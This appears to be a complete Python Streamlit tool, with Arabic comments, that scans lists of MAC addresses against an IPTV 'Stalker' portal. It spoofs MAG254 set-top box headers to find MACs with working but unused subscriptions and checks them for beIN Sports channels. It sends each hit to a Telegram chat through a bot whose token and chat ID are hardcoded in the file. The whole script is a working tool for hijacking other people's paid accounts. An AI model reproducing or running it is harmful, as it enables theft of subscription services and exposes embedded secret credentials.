import streamlit as st
import requests
import time
import telebot
import re
import urllib3

# تعطيل تحذيرات SSL المزعجة
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- بياناتك الثابتة ---
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الكلمات المفتاحية
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# إعداد الواجهة
st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
st.markdown("<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami Pro</h1>", unsafe_allow_html=True)

raw_data = st.text_area("ضع الرابط والماكات هنا:", height=150, placeholder="http://example.com/c/\n00:1A:79:...")

def get_headers(mac):
    return {
        'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
        'Cookie': f'mac={mac}',
        'X-User-Agent': 'Model: MAG254; Link: WiFi',
        'Referer': 'http://mag.infomir.com/',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

if st.button("🚀 بدء المسح الشامل"):
    if raw_data:
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            # تنظيف الرابط
            base_url = host_match.group(0).split('/portal.php')[0].rstrip('/')
            if not base_url.endswith('/portal.php'):
                api_url = f"{base_url}/portal.php"
            else:
                api_url = base_url

            st.success(f"📡 السيرفر المستهدف: {api_url}")
            
            # لوحة النتائج
            checked_count = 0
            found_count = 0
            c1, c2 = st.columns(2)
            stat_checked = c1.metric("تم فحص", "0")
            stat_found = c2.metric("الصيد الذهبي", "0")
            progress_bar = st.progress(0)
            log_area = st.empty()

            for i, current_mac in enumerate(macs):
                checked_count += 1
                headers = get_headers(current_mac)
                
                try:
                    # محاولة جلب البروفايل مباشرة
                    profile_url = f"{api_url}?type=stb&action=get_profile&force_stb=1"
                    r = requests.get(profile_url, headers=headers, timeout=10, verify=False)
                    
                    if r.status_code == 200 and '"active_cons"' in r.text:
                        active = re.search(r'"active_cons"\s*:\s*"(\d+)"', r.text)
                        is_active = active.group(1) if active else "1"

                        if is_active == "0":
                            found_count += 1
                            # فحص القنوات
                            ch_url = f"{api_url}?type=itv&action=get_all_channels"
                            r_ch = requests.get(ch_url, headers=headers, timeout=10, verify=False)
                            ch_text = r_ch.text.upper()
                            
                            found_channels = [n for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
                            
                            # إرسال تلغرام
                            msg = (f"🎯 **صيد جديد - Ayoub**\n\n🖥️ الماك: `{current_mac}`\n🌐 السيرفر: `{base_url}`\n"
                                   f"📺 القنوات: {', '.join(found_channels) if found_channels else 'غير محددة'}")
                            bot.send_message(ID, msg, parse_mode="Markdown")
                            st.toast(f"✅ تم صيد: {current_mac}")
                    
                    elif r.status_code == 401:
                        log_area.warning(f"⚠️ الماك محمي أو مرفوض: {current_mac}")
                except Exception as e:
                    log_area.error(f"❌ خطأ في الاتصال: {current_mac}")

                # تحديث الواجهة
                stat_checked.metric("تم فحص", checked_count)
                stat_found.metric("الصيد الذهبي", found_count)
                progress_bar.progress((i + 1) / len(macs))
                time.sleep(0.5) # سرعة معقولة لتجنب الحظر

            st.balloons()
        else:
            st.error("❌ الرابط أو الماكات غير صحيحة.")
    else:
        st.warning("⚠️ الصندوق فارغ!")
